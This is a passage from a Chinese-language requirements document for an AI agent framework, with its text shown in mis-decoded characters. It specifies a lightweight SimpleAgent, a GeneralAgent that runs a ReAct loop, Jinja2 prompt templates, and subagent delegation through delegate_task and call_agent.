| å·¥å…·å®šåˆ¶ | å¯æŒ‡å®šå·¥å…·åˆ—è¡¨ | åŠ¨æ€åŠ è½½å·¥å…· |
| è½»é‡å¯åŠ¨ | <100ms | æ— å·¥ä½œåŒºã€æ— ä¼šè¯åˆå§‹åŒ– |

**è°ƒç”¨æ¥å£**ï¼š

```python
# æ–¹å¼ 1: ä»£ç è°ƒç”¨
agent = SimpleAgent()
result = await agent.run(
    template="ä½ æ˜¯ {role}ã€‚ä»»åŠ¡: {task}",
    params={"role": "åˆ†æå¸ˆ", "task": "åˆ†ææ•°æ®"},
    tools=["read_file", "write_file"],
    model_type="reasoning"  # base/reasoning/vision/code/chat
)

# æ–¹å¼ 2: ä½¿ç”¨é¢„å®šä¹‰æ¨¡æ¿
agent = SimpleAgent(template_path="templates/code_reviewer.jinja2")
result = await agent.run(
    params={"file_path": "uploads/api.py"},
    user_message="å®¡æŸ¥è¿™ä¸ªæ–‡ä»¶çš„å®‰å…¨é—®é¢˜"
)

# æ–¹å¼ 3: é€šè¿‡ GeneralAgent è°ƒç”¨ï¼ˆdelegate_taskï¼‰
# GeneralAgent ä¼šè‡ªåŠ¨åˆ›å»º SimpleAgent å®ä¾‹å¹¶è°ƒç”¨
delegate_task("å®¡æŸ¥ uploads/api.py çš„ä»£ç è´¨é‡")
```

**Graph ç»“æ„**ï¼ˆæç®€ï¼‰ï¼š

```
START â†’ agent_node â†’ finalize_node â†’ END
```

æ— å¾ªç¯ã€æ— è·¯ç”±ã€å•æ¬¡æ‰§è¡Œã€‚

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… å•æ¬¡æ¨ç†å»¶è¿Ÿ <3sï¼ˆå« LLM è°ƒç”¨ï¼‰
- âœ… å¯åŠ¨å¼€é”€ <100ms
- âœ… æ”¯æŒ 5 ç§æ¨¡å‹ç±»å‹ï¼ˆbase/reasoning/vision/code/chatï¼‰
- âœ… æ”¯æŒåŠ¨æ€å·¥å…·åŠ è½½
- âœ… æ”¯æŒ Jinja2 æ¨¡æ¿

**å®ç°å‚è€ƒ**ï¼š`simpleAgent/simple_agent.py`ã€`simpleAgent/graph/builder.py`

---

**éœ€æ±‚ 5ï¼šSimpleAgent æ¨¡æ¿ç³»ç»Ÿ**

**éœ€æ±‚æè¿°**ï¼š
æ”¯æŒ Jinja2 æ¨¡æ¿è¯­æ³•ï¼Œå…è®¸å¼€å‘è€…è‡ªå®šä¹‰ Prompt æ¨¡æ¿ã€‚

**æ¨¡æ¿æ ¼å¼**ï¼š

```jinja2
ä½ æ˜¯ä¸€ä¸ª {{ role }}ã€‚

ä½ çš„ä»»åŠ¡ï¼š{{ task }}

{% if context %}
ä¸Šä¸‹æ–‡ä¿¡æ¯ï¼š
{{ context }}
{% endif %}

è¯·æŒ‰ç…§ä»¥ä¸‹è¦æ±‚å®Œæˆä»»åŠ¡ï¼š
{% for requirement in requirements %}
- {{ requirement }}
{% endfor %}

{% if output_format %}
è¾“å‡ºæ ¼å¼ï¼š{{ output_format }}
{% endif %}
```

**ä½¿ç”¨æ–¹å¼**ï¼š

```python
# æ–¹å¼ 1: å†…è”æ¨¡æ¿
agent = SimpleAgent()
result = await agent.run(
    template="ä½ æ˜¯ {role}ã€‚ä»»åŠ¡: {task}",
    params={"role": "æ•°æ®åˆ†æå¸ˆ", "task": "åˆ†æé”€å”®æ•°æ®"}
)

# æ–¹å¼ 2: æ¨¡æ¿æ–‡ä»¶
agent = SimpleAgent(template_path="templates/analyst.jinja2")
result = await agent.run(
    params={
        "role": "è´¢åŠ¡åˆ†æå¸ˆ",
        "task": "ç”Ÿæˆå­£åº¦æŠ¥å‘Š",
        "requirements": ["åŒ…å«å›¾è¡¨", "æ€»ç»“è¶‹åŠ¿"],
        "output_format": "Markdown"
    }
)
```

**å†…ç½®æ¨¡æ¿ç¤ºä¾‹**ï¼š

| æ¨¡æ¿ | è·¯å¾„ | ç”¨é€” |
|------|------|------|
| ä»£ç å®¡æŸ¥ | `templates/code_reviewer.jinja2` | å®¡æŸ¥ä»£ç å®‰å…¨ã€é£æ ¼ã€æ€§èƒ½ |
| æ•°æ®åˆ†æ | `templates/data_analyst.jinja2` | åˆ†ææ•°æ®å¹¶ç”ŸæˆæŠ¥å‘Š |
| æ–‡æ¡£æ€»ç»“ | `templates/summarizer.jinja2` | æ€»ç»“é•¿æ–‡æ¡£ |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒ Jinja2 å®Œæ•´è¯­æ³•ï¼ˆå˜é‡ã€æ¡ä»¶ã€å¾ªç¯ï¼‰
- âœ… æ”¯æŒå†…è”æ¨¡æ¿å’Œæ–‡ä»¶æ¨¡æ¿
- âœ… æ¨¡æ¿æ¸²æŸ“é”™è¯¯æ—¶è¿”å›æ¸…æ™°æç¤º
- âœ… æä¾› 3-5 ä¸ªå†…ç½®æ¨¡æ¿

**å®ç°å‚è€ƒ**ï¼š`simpleAgent/utils/prompt_builder.py`

---

#### 3.3 GeneralAgent æ¨¡æ¿

**éœ€æ±‚ 6ï¼šGeneralAgent æ ¸å¿ƒåŠŸèƒ½**

**éœ€æ±‚æè¿°**ï¼š
æä¾›åŠŸèƒ½å®Œæ•´çš„ Agent æ¨¡æ¿ï¼Œæ”¯æŒå¤šè½®å¯¹è¯ã€æŠ€èƒ½ç³»ç»Ÿã€HITL å®¡æ‰¹ã€ä¼šè¯æŒä¹…åŒ–ã€‚

**æ ¸å¿ƒç‰¹æ€§**ï¼š

| ç‰¹æ€§ | è¯´æ˜ | å®ç°æ–¹å¼ |
|------|------|----------|
| æœ‰çŠ¶æ€ | ä¿ç•™å®Œæ•´ä¼šè¯å†å² | SessionStoreï¼ˆSQLiteï¼‰ |
| ReAct Loop | å¤šè½®æ¨ç†æ‰§è¡Œ | LangGraph å¾ªç¯ |
| æŠ€èƒ½ç³»ç»Ÿ | æ”¯æŒ @mention åŠ è½½æŠ€èƒ½ | SkillRegistry |
| å·¥å…·ç³»ç»Ÿ | æ”¯æŒ @mention åŠ è½½å·¥å…· | ToolRegistry |
| HITL å®¡æ‰¹ | é«˜é£é™©æ“ä½œéœ€å®¡æ‰¹ | ApprovalChecker |
| å·¥ä½œåŒºéš”ç¦» | æ¯ä¸ªä¼šè¯ç‹¬ç«‹ç›®å½• | WorkspaceManager |
| ä¸Šä¸‹æ–‡ç®¡ç† | è‡ªåŠ¨å‹ç¼©é•¿å¯¹è¯ | ContextCompressor |

---

**éœ€æ±‚ 7ï¼šGeneralAgent æ¨¡æ¿ç³»ç»Ÿ**

**éœ€æ±‚æè¿°**ï¼š
æ”¯æŒ Jinja2 æ¨¡æ¿è¯­æ³•ï¼Œå…è®¸å¼€å‘è€…è‡ªå®šä¹‰ Prompt æ¨¡æ¿ã€‚ä¸ SimpleAgent ç±»ä¼¼ï¼ŒGeneralAgent ä¹Ÿé‡‡ç”¨æ¨¡æ¿åŒ–è®¾è®¡ï¼Œä¾¿äºå®šåˆ¶å’Œç»´æŠ¤ã€‚

**æ¨¡æ¿æ¶æ„**ï¼š

```
generalAgent/config/prompt_templates/
â”œâ”€â”€ charlie_identity.jinja2    # Charlie åŸºç¡€èº«ä»½ï¼ˆå…±äº«ï¼‰
â”œâ”€â”€ planner.jinja2             # Planner èŠ‚ç‚¹ç³»ç»Ÿæç¤º
â”œâ”€â”€ subagent.jinja2            # Subagent ç³»ç»Ÿæç¤º
â””â”€â”€ finalize.jinja2            # Finalize èŠ‚ç‚¹ç³»ç»Ÿæç¤º
```

**æ¨¡æ¿åŠ è½½æ–¹å¼**ï¼š

```python
# æ–¹å¼ 1: ä½¿ç”¨é»˜è®¤æ¨¡æ¿ï¼ˆæ¨èï¼‰
from generalAgent.graph.prompts import PLANNER_SYSTEM_PROMPT

# ç³»ç»Ÿè‡ªåŠ¨ä»æ¨¡æ¿åŠ è½½
system_prompt = PLANNER_SYSTEM_PROMPT

# æ–¹å¼ 2: è‡ªå®šä¹‰æ¨¡æ¿å‚æ•°
from generalAgent.utils.prompt_builder import PromptBuilder

# è‡ªå®šä¹‰ Planner æç¤º
custom_planner = PromptBuilder.load_planner_prompt(
    extra_instructions="é¢å¤–å·¥ä½œè¦æ±‚...",
    custom_context="è‡ªå®šä¹‰ä¸Šä¸‹æ–‡..."
)

# æ–¹å¼ 3: å®Œå…¨è‡ªå®šä¹‰æ¨¡æ¿
custom_prompt = PromptBuilder.load_custom_prompt(
    template_path="my_templates/custom_planner.jinja2",
    role="ä¸“ä¸šé¡¾é—®",
    domain="é‡‘èåˆ†æ"
)
```

**å†…ç½®æ¨¡æ¿ç¤ºä¾‹**ï¼š

**1. charlie_identity.jinja2** - Charlie åŸºç¡€èº«ä»½
```jinja2
ä½ æ˜¯ Charlieï¼Œä¸€ä¸ªé«˜æ•ˆã€å‹å¥½çš„ AI åŠ©æ‰‹ã€‚

æ ¸å¿ƒèƒ½åŠ›ï¼š
- è°ƒç”¨å·¥å…·å®Œæˆä»»åŠ¡
- å§”æ´¾å­ä»»åŠ¡ç»™ä¸“ç”¨ agent
- æ‹†è§£å¤æ‚ä»»åŠ¡ä¸ºå¯æ‰§è¡Œæ­¥éª¤

å›å¤åŸåˆ™ï¼š
- ç®€æ´ç›´æ¥ï¼Œä¸­æ–‡ä¸ºä¸»ï¼ŒæŠ€æœ¯æœ¯è¯­ä¿ç•™è‹±æ–‡
- ä¸ç¼–é€ ä¿¡æ¯ï¼Œä¸å‡è®¾ç”¨æˆ·æ„å›¾
- é‡åˆ°ä¸ç¡®å®šä¿¡æ¯æ—¶ä¸»åŠ¨è¯¢é—®
```

**2. planner.jinja2** - Planner èŠ‚ç‚¹æç¤º
```jinja2
{{ charlie_identity }}

# å·¥ä½œæ–¹å¼
ä½ ä»¥è‡ªä¸»å¾ªç¯æ–¹å¼å·¥ä½œï¼šåˆ†æè¯·æ±‚ â†’ è°ƒç”¨å·¥å…· â†’ æ£€æŸ¥å®Œæˆåº¦ â†’ ç»§ç»­æˆ–åœæ­¢

## å·¥å…·ä½¿ç”¨åœºæ™¯

### ä»»åŠ¡è¿½è¸ª
å¤šæ­¥éª¤ä»»åŠ¡ï¼ˆ3+ æ­¥éª¤ï¼‰ä½¿ç”¨ **todo_write/todo_read** è¿½è¸ªè¿›åº¦ã€‚

### ä»»åŠ¡å§”æ´¾
- **delegate_task**: å°†ç‹¬ç«‹å­ä»»åŠ¡å§”æ´¾ç»™ä¸“ç”¨ agent
  - ä½•æ—¶å§”æ´¾ï¼šå¤æ‚å­ä»»åŠ¡ã€æ‰¹é‡æ“ä½œã€è¯•é”™ä»»åŠ¡
  - ä½•æ—¶ä¸å§”æ´¾ï¼šç®€å•æŸ¥è¯¢ã€å½“å‰ä»»åŠ¡çš„ä¸‹ä¸€æ­¥éª¤

### æ–‡ä»¶æ“ä½œ
- **æ–°æ–‡ä»¶**ï¼šwrite_file åˆ›å»º
- **ä¿®æ”¹æ–‡ä»¶**ï¼š**ä¼˜å…ˆ edit_file**ï¼ˆold_string â†’ new_stringï¼‰
```

**3. subagent.jinja2** - Subagent æç¤º
```jinja2
ä½ æ˜¯ä»»åŠ¡æ‰§è¡Œå™¨ï¼ˆSubagentï¼‰ï¼Œè´Ÿè´£å®Œæˆä¸» Agent å§”æ‰˜çš„å…·ä½“ä»»åŠ¡ã€‚

âš ï¸ **é‡è¦ï¼šä½ åœ¨ç‹¬ç«‹ä¸Šä¸‹æ–‡ä¸­è¿è¡Œ**
- **ä¸» Agent çœ‹ä¸åˆ°ä½ çš„å¯¹è¯å†å²ï¼Œåªèƒ½çœ‹åˆ°ä½ çš„æœ€åä¸€æ¡æ¶ˆæ¯**
- å› æ­¤ä½ å¿…é¡»åœ¨æœ€åæ¶ˆæ¯ä¸­æä¾›å®Œæ•´æ‘˜è¦

æ ¸å¿ƒåŸåˆ™ï¼š
- ç›®æ ‡å¯¼å‘ï¼šåªå®Œæˆä»»åŠ¡æè¿°ä¸­çš„å…·ä½“ç›®æ ‡
- ç›´æ¥æ‰§è¡Œï¼šæ”¶åˆ°ä»»åŠ¡åç«‹å³ä½¿ç”¨å·¥å…·å®Œæˆ
- å®Œæ•´æ‘˜è¦ï¼šæœ€åæ¶ˆæ¯å¿…é¡»åŒ…å«æ‰§è¡Œè¿‡ç¨‹å’Œç»“æœ
```

**æ¨¡æ¿å‚æ•°æ”¯æŒ**ï¼š

GeneralAgent æ¨¡æ¿æ”¯æŒåŠ¨æ€å‚æ•°æ³¨å…¥ï¼š

```python
# åŠ è½½ Planner æç¤ºå¹¶æ³¨å…¥è‡ªå®šä¹‰å‚æ•°
planner_prompt = PromptBuilder.load_planner_prompt(
    # è‡ªå®šä¹‰å‚æ•°
    extra_tools_guidance="ä½¿ç”¨ @fetch_web è·å–æœ€æ–°ä¿¡æ¯",
    domain_knowledge="ä½ ç²¾é€šé‡‘èæŠ•èµ„é¢†åŸŸ",
    output_requirements="æ‰€æœ‰åˆ†æå¿…é¡»åŒ…å«æ•°æ®æ¥æº"
)
```

**æ¨¡æ¿ç³»ç»Ÿä¼˜åŠ¿**ï¼š

| ä¼˜åŠ¿ | è¯´æ˜ |
|------|------|
| **å¯ç»´æŠ¤æ€§** | Prompt é›†ä¸­ç®¡ç†ï¼Œä¿®æ”¹æ— éœ€æ”¹ä»£ç  |
| **å¯å®šåˆ¶æ€§** | æ”¯æŒ Jinja2 å®Œæ•´è¯­æ³•ï¼ˆå˜é‡ã€æ¡ä»¶ã€å¾ªç¯ï¼‰ |
| **ä¸€è‡´æ€§** | å¤šä¸ªèŠ‚ç‚¹å…±äº«åŸºç¡€èº«ä»½ï¼ˆcharlie_identityï¼‰ |
| **å®‰å…¨æ€§** | ä½¿ç”¨ SandboxedEnvironment é˜²æ­¢ä»£ç æ³¨å…¥ |
| **ç‰ˆæœ¬æ§åˆ¶** | æ¨¡æ¿æ–‡ä»¶å¯çº³å…¥ Git ç®¡ç† |

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒ Jinja2 å®Œæ•´è¯­æ³•
- âœ… æ”¯æŒå‚æ•°åŒ–æ¨¡æ¿åŠ è½½
- âœ… æ”¯æŒè‡ªå®šä¹‰æ¨¡æ¿è·¯å¾„
- âœ… æ¨¡æ¿æ¸²æŸ“é”™è¯¯æ—¶è¿”å›æ¸…æ™°æç¤º
- âœ… ä¸ç°æœ‰ä»£ç å‘åå…¼å®¹

**å®ç°å‚è€ƒ**ï¼š
- `generalAgent/utils/prompt_builder.py` - æ¨¡æ¿åŠ è½½å™¨
- `generalAgent/config/prompt_templates/` - æ¨¡æ¿æ–‡ä»¶ç›®å½•
- `generalAgent/graph/prompts.py` - é»˜è®¤ Prompt åŠ è½½

**Graph ç»“æ„**ï¼ˆReAct Loopï¼‰ï¼š

```
START â†’ planner_node â†’ tools_node â†’ planner_node â†’ ... â†’ finalize_node â†’ END
                â†“                       â†‘
              (tool_calls?)              |
                â†“                       |
            summarization_node          |
                (if context full)        |
                â†“_____________________|
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒè‡³å°‘ 100 è½®å¯¹è¯
- âœ… æ”¯æŒ ReAct Loopï¼ˆæœ€å¤§å¾ªç¯ 100 æ¬¡ï¼Œå¯é…ç½®ï¼‰
- âœ… æ”¯æŒæŠ€èƒ½å’Œå·¥å…·æŒ‰éœ€åŠ è½½
- âœ… æ”¯æŒä¼šè¯æŒä¹…åŒ–å’Œæ¢å¤
- âœ… æ”¯æŒä¸Šä¸‹æ–‡è‡ªåŠ¨å‹ç¼©ï¼ˆ>95% token ä½¿ç”¨ç‡æ—¶ï¼‰

**å®ç°å‚è€ƒ**ï¼š`generalAgent/runtime/app.py`ã€`generalAgent/graph/builder.py`

---

**éœ€æ±‚ 7ï¼šAgent è°ƒç”¨æœºåˆ¶ï¼ˆcall_agentï¼‰**

**éœ€æ±‚æè¿°**ï¼š
GeneralAgent å¯ä»¥é€šè¿‡ `call_agent` å·¥å…·è°ƒç”¨å…¶ä»– Agentï¼ˆå¦‚ @simpleï¼‰ã€‚

**è°ƒç”¨æµç¨‹**ï¼š

```
1. ç”¨æˆ·è¾“å…¥åŒ…å« @simple
   â†“
2. ç³»ç»Ÿè¯†åˆ« @mention â†’ ç”Ÿæˆ transfer_to_simple å·¥å…·
   â†“
3. GeneralAgent å†³ç­–è°ƒç”¨ transfer_to_simple(task=...)
   â†“
4. ç³»ç»Ÿåˆ›å»º SimpleAgent å®ä¾‹
   â”œâ”€ ç»§æ‰¿å·¥å…·ï¼ˆavailable_to_subagent: true çš„å·¥å…·ï¼‰
   â”œâ”€ ç»§æ‰¿å·¥ä½œåŒºè·¯å¾„
   â””â”€ ä¸ç»§æ‰¿ä¼šè¯å†å²ï¼ˆSimpleAgent æ— çŠ¶æ€ï¼‰
   â†“
5. SimpleAgent æ‰§è¡Œä»»åŠ¡
   â†“
6. è¿”å›ç»“æœç»™ GeneralAgent
   â†“
7. GeneralAgent ç»§ç»­å¯¹è¯
```

**å·¥å…·è‡ªåŠ¨ç”Ÿæˆ**ï¼š

```python
# å½“ç”¨æˆ· @simple æ—¶ï¼Œç³»ç»Ÿè‡ªåŠ¨ç”Ÿæˆæ­¤å·¥å…·ï¼š
@tool
def transfer_to_simple(task: str) -> str:
    """è°ƒç”¨ SimpleAgent æ‰§è¡Œå¿«é€Ÿä»»åŠ¡

    Args:
        task: ä»»åŠ¡æè¿°

    Returns:
        SimpleAgent çš„æ‰§è¡Œç»“æœ
    """
    # å†…éƒ¨å®ç°ï¼šåˆ›å»º SimpleAgent å¹¶è°ƒç”¨
    agent = SimpleAgent()
    result = await agent.run(user_message=task)
    return result
```

**éªŒæ”¶æ ‡å‡†**ï¼š
- âœ… æ”¯æŒé€šè¿‡ @mention è°ƒç”¨ Agent
- âœ… å·¥å…·è‡ªåŠ¨ç”Ÿæˆï¼ˆtransfer_to_{agent_id}ï¼‰
- âœ… å­ Agent ç»§æ‰¿å·¥å…·å’Œå·¥ä½œåŒº
- âœ… å­ Agent æ‰§è¡Œç»“æœæ­£ç¡®è¿”å›

**å®ç°å‚è€ƒ**ï¼š`generalAgent/agents/handoff_tools.py`ã€`generalAgent/tools/builtin/call_agent.py`

---

### å››ã€å‚è€ƒä»£ç ä½ç½®

| åŠŸèƒ½æ¨¡å— | ä»£ç è·¯å¾„ |
|---------|---------|
| Agent Card Schema | `generalAgent/agents/schema.py` |
| Agent é…ç½®æ–‡ä»¶ | `generalAgent/config/agents.yaml` |
| Agent æ³¨å†Œè¡¨ | `generalAgent/agents/registry.py` |
| Agent å·¥å‚ | `generalAgent/agents/factory.py` |
| Handoff å·¥å…·ç”Ÿæˆ | `generalAgent/agents/handoff_tools.py` |
| SimpleAgent å®ç° | `simpleAgent/simple_agent.py` |
| SimpleAgent Graph | `simpleAgent/graph/builder.py` |
| SimpleAgent æ¨¡æ¿ | `simpleAgent/utils/prompt_builder.py` |
| GeneralAgent åº”ç”¨ | `generalAgent/runtime/app.py` |
| GeneralAgent Graph | `generalAgent/graph/builder.py` |
| call_agent å·¥å…· | `generalAgent/tools/builtin/call_agent.py` |
| delegate_task å·¥å…· | `generalAgent/tools/builtin/delegate_task.py` |

---

## å…«ã€å¤šAgentåä½œ

### äº§å“å®šä½

å¤šAgentåä½œæ˜¯æ¡†æ¶çš„ä»»åŠ¡åˆ†å‘å±‚,æ”¯æŒä¸»Agentå°†å¤æ‚ä»»åŠ¡å§”æ´¾ç»™ä¸“ç”¨å­Agentæˆ–ä¸åŒç±»å‹çš„Agentæ‰§è¡Œã€‚é€šè¿‡`delegate_task`(åŒç±»å‹å‰¯æœ¬)å’Œ`call_agent`(ä¸åŒç±»å‹Agent)ä¸¤ç§æœºåˆ¶,å®ç°ä»»åŠ¡éš”ç¦»ã€ä¸Šä¸‹æ–‡ç»§æ‰¿ã€ç»“æœèšåˆçš„å®Œæ•´åä½œæµç¨‹ã€‚

**ä»·å€¼ä¸»å¼ **:
- **ä»»åŠ¡éš”ç¦»**:Subagentç‹¬ç«‹ä¸Šä¸‹æ–‡,é¿å…æ±¡æŸ“ä¸»å¯¹è¯å†å²(100+è½®å¯¹è¯åœºæ™¯)
- **èƒ½åŠ›å¤ç”¨**:ç»§æ‰¿ä¸»Agentçš„å·¥å…·ã€æŠ€èƒ½ã€å·¥ä½œåŒº,æ— éœ€é‡å¤é…ç½®
- **ç±»å‹åˆ‡æ¢**:æ ¹æ®ä»»åŠ¡ç‰¹å¾é€‰æ‹©SimpleAgent(å¿«é€Ÿ)æˆ–GeneralAgent(å¤æ‚)
- **é€æ˜åä½œ**:Subagentæ‰§è¡Œå¯¹ç”¨æˆ·å¯è§,æ”¯æŒå®æ—¶æµå¼è¾“å‡º

**ä¸¤ç§åä½œæœºåˆ¶å¯¹æ¯”**:

| ç»´åº¦ | delegate_task | call_agent |
|------|---------------|------------|
| **è°ƒç”¨å¯¹è±¡** | è°ƒç”¨è‡ªèº«å‰¯æœ¬(åŒç±»å‹) | è°ƒç”¨å…¶ä»–ç±»å‹Agent |
| **ä½¿ç”¨åœºæ™¯** | æ·±åº¦ç ”ç©¶ã€æ‰¹é‡å¤„ç†ã€åå¤è°ƒè¯• | å¿«é€Ÿåˆ†æã€ä¸åŒèƒ½åŠ› |
| **ä¸Šä¸‹æ–‡** | ç‹¬ç«‹(ç»§æ‰¿å·¥å…·/æŠ€èƒ½/å·¥ä½œåŒº) | ç‹¬ç«‹(å¯é€‰ç»§æ‰¿) |
| **çŠ¶æ€ç®¡ç†** | æœ‰çŠ¶æ€(GeneralAgent) | æ— çŠ¶æ€(SimpleAgent)æˆ–æœ‰çŠ¶æ€ |
| **å®ç°æ–¹å¼** | LangGraphå­å›¾æ‰§è¡Œ | ç›´æ¥è°ƒç”¨Agentå·¥å‚ |
| **è¿”å›ç»“æœ** | JSON(ok, result, loops) | Commandå¯¹è±¡(æ›´æ–°çˆ¶çŠ¶æ€) |

---

### æ ¸å¿ƒåœºæ™¯

#### åœºæ™¯ 1:æ·±åº¦ç ”ç©¶ä»»åŠ¡(delegate_task)

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¯¢é—®"Python 3.13æœ‰å“ªäº›æ–°ç‰¹æ€§?",ä¸»Agentéœ€è¦æ‰§è¡Œå¤šæ¬¡æœç´¢ã€æ–‡æ¡£é˜…è¯»ã€å¯¹æ¯”åˆ†æã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. ä¸»Agentæ£€æµ‹åˆ°éœ€è¦å¤šè½®è¿­ä»£çš„ç ”ç©¶ä»»åŠ¡
2. è°ƒç”¨`delegate_task("æœç´¢å¹¶æ€»ç»“Python 3.13æ–°ç‰¹æ€§...")`
3. åˆ›å»ºsubagentç‹¬ç«‹ä¸Šä¸‹æ–‡(context_id: subagent-abc123)
4. Subagentç»§æ‰¿:
   - ä¸»Agentçš„@mentionedå·¥å…·(å¦‚fetch_web)
   - ä¸»Agentçš„å·¥ä½œåŒºè·¯å¾„
   - ä¸»Agentçš„æŠ€èƒ½
5. Subagentæ‰§è¡Œ:
   - Loop 1: æœç´¢Python 3.13å®˜æ–¹æ–‡æ¡£
   - Loop 2: æå–å…³é”®ç‰¹æ€§åˆ—è¡¨
   - Loop 3: æœç´¢ç¤¾åŒºåé¦ˆ
   - Loop 4: å¯¹æ¯”3.12å·®å¼‚
   - Loop 5: ç”Ÿæˆæ€»ç»“æŠ¥å‘Š
6. è¿”å›ç»“æœç»™ä¸»Agent
7. ä¸»Agentå°†ç»“æœæ•´åˆåˆ°å›å¤ä¸­

**å…³é”®ç‚¹**:
- Subagentæ‰§è¡Œ10+è½®loop,ä½†ä¸æ±¡æŸ“ä¸»å¯¹è¯
- ç»§æ‰¿å·¥å…·(fetch_web)æ— éœ€é‡æ–°@mention
- å®æ—¶æµå¼è¾“å‡º(ç”¨æˆ·å¯è§subagentè¿›åº¦)

---

#### åœºæ™¯ 2:å¿«é€Ÿä»£ç å®¡æŸ¥(call_agent)

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¦æ±‚"åˆ†æuploads/script.pyçš„å¤æ‚åº¦",ä¸»Agent(GeneralAgent)å†³å®šä½¿ç”¨è½»é‡çº§SimpleAgentå¿«é€Ÿå®Œæˆã€‚

**ç³»ç»Ÿè¡Œä¸º**:
1. ä¸»Agentæ£€æµ‹åˆ°ç®€å•åˆ†æä»»åŠ¡
2. è°ƒç”¨`call_agent(agent_id="simple", task="åˆ†æscript.pyå¤æ‚åº¦...")`
3. ç³»ç»ŸåŠ è½½SimpleAgent:
   - æ— çŠ¶æ€,å•æ¬¡æ¨ç†
   - å¯åŠ¨æ—¶é—´<100ms
4. SimpleAgentæ‰§è¡Œ:
   - è¯»å–æ–‡ä»¶å†…å®¹
   - ä½¿ç”¨reasoningæ¨¡å‹åˆ†æ
   - è¿”å›å¤æ‚åº¦è¯„ä¼°
5. è¿”å›Commandå¯¹è±¡æ›´æ–°ä¸»AgentçŠ¶æ€
6. ä¸»Agentæ¥æ”¶ç»“æœå¹¶å›å¤ç”¨æˆ·

**å…³é”®ç‚¹**:
- SimpleAgentå“åº”é€Ÿåº¦å¿«(3ç§’ vs GeneralAgent 10ç§’+)
- æ— éœ€åˆ›å»ºä¼šè¯å’Œå·¥ä½œåŒº
- é€‚åˆé«˜é¢‘è°ƒç”¨åœºæ™¯

---

#### åœºæ™¯ 3:æ‰¹é‡æ–‡ä»¶å¤„ç†(delegate_task)

**ç”¨æˆ·æ•…äº‹**:
ç”¨æˆ·è¦æ±‚"åˆ†æuploads/ç›®å½•ä¸‹æ‰€æœ‰Pythonæ–‡ä»¶,æ‰¾å‡ºä½¿ç”¨deprecated APIçš„åœ°æ–¹"

**ç³»ç»Ÿè¡Œä¸º**:
1. ä¸»Agentæ‰«æç›®å½•,å‘ç°50ä¸ªPythonæ–‡ä»¶
2. è°ƒç”¨`delegate_task("æ‰«æ50ä¸ªæ–‡ä»¶,è®°å½•deprecated APIä½¿ç”¨...")`
3. Subagentç»§æ‰¿ä¸»Agentçš„å·¥ä½œåŒº
4. Subagentæ‰§è¡Œ:
   - Loop 1-50: é€ä¸ªè¯»å–æ–‡ä»¶
   - Loop 51-100: æœç´¢deprecatedå…³é”®å­—
   - Loop 101: ç”ŸæˆMarkdownè¡¨æ ¼æ±‡æ€»
5. è¿”å›ç»“æœ:[æ–‡ä»¶è·¯å¾„ | è¡Œå· | APIåç§° | å»ºè®®æ›¿æ¢]
6. ä¸»Agentå±•ç¤ºè¡¨æ ¼ç»™ç”¨æˆ·

**å…³é”®ç‚¹**:
- 100+æ¬¡å·¥å…·è°ƒç”¨ä¸æ±¡æŸ“ä¸»å¯¹è¯
- Subagentå¯ä»¥è®¿é—®ç›¸åŒå·¥ä½œåŒº
- ç»“æœæ ¼å¼åŒ–ç”±subagentå®Œæˆ

---

### åŠŸèƒ½éœ€æ±‚

#### éœ€æ±‚ 1:delegate_taskå·¥å…·(åŒç±»å‹å‰¯æœ¬)

**åŠŸèƒ½æè¿°**:
å°†å¤æ‚å­ä»»åŠ¡å§”æ´¾ç»™ç‹¬ç«‹çš„subagentæ‰§è¡Œ,é€‚åˆéœ€è¦å¤šè½®è¿­ä»£ã€å¤§é‡ä¸­é—´ç»“æœçš„ä»»åŠ¡ã€‚

**å·¥å…·ç­¾å**:
```python
@tool
async def delegate_task(
    task: str,
    max_loops: int = 50,
    config: Annotated[dict, InjectedToolArg] = None,
) -> str:
    """å§”æ´¾ç‹¬ç«‹å­ä»»åŠ¡ç»™ä¸“ç”¨å­agentæ‰§è¡Œ"""
```

**å‚æ•°è¯´æ˜**:
- `task`: è‡ªåŒ…å«çš„ä»»åŠ¡æè¿°(å¿…é¡»åŒ…å«:ç›®æ ‡ã€ä¸Šä¸‹æ–‡ã€æœŸæœ›æ ¼å¼)
- `max_loops`: å­agentæœ€å¤§å¾ªç¯æ¬¡æ•°(é»˜è®¤50)
- `config`: æ³¨å…¥çš„é…ç½®(ç”±LangGraphè‡ªåŠ¨æä¾›)

**æ‰§è¡Œæµç¨‹**:
1. ç”Ÿæˆå”¯ä¸€context_id: `subagent-{uuid[:8]}`
2. ä»parent_state_storeè·å–çˆ¶çŠ¶æ€
3. ç»§æ‰¿çˆ¶AgentçŠ¶æ€:
   - `mentioned_agents`: ç»§æ‰¿@mentionedå·¥å…·åˆ—è¡¨
   - `active_skill`: ç»§æ‰¿å½“å‰æ¿€æ´»æŠ€èƒ½
   - `workspace_path`: ç»§æ‰¿å·¥ä½œåŒºè·¯å¾„
   - `uploaded_files`: ç»§æ‰¿å·²ä¸Šä¼ æ–‡ä»¶åˆ—è¡¨
4. åˆ›å»ºç‹¬ç«‹delegated_state:
   - `messages`: [HumanMessage(task)]
   - `context_id`: subagent-xxx
   - `parent_context`: çˆ¶Agentçš„context_id
5. è°ƒç”¨app_graph.astream()æ‰§è¡Œsubagent
6. å®æ—¶æ‰“å°subagentè¾“å‡º(æµå¼)
7. æå–æœ€åä¸€æ¡AIMessageä½œä¸ºç»“æœ
8. è¿”å›JSON:
   ```json
   {
       "ok": true,
       "result": "ä»»åŠ¡æ‰§è¡Œç»“æœ...",
       "loops": 15,
       "context_id": "subagent-abc123"
   }
   ```

**ç»§æ‰¿è§„åˆ™**:
- âœ… ç»§æ‰¿:`mentioned_agents`, `active_skill`, `workspace_path`, `uploaded_files`
- âŒ ä¸ç»§æ‰¿:`messages`(ç‹¬ç«‹å¯¹è¯å†å²), `todos`(ç‹¬ç«‹ä»»åŠ¡åˆ—è¡¨)

**éªŒæ”¶æ ‡å‡†**:
- âœ… Subagentçœ‹ä¸åˆ°ä¸»å¯¹è¯å†å²(ç‹¬ç«‹ä¸Šä¸‹æ–‡)
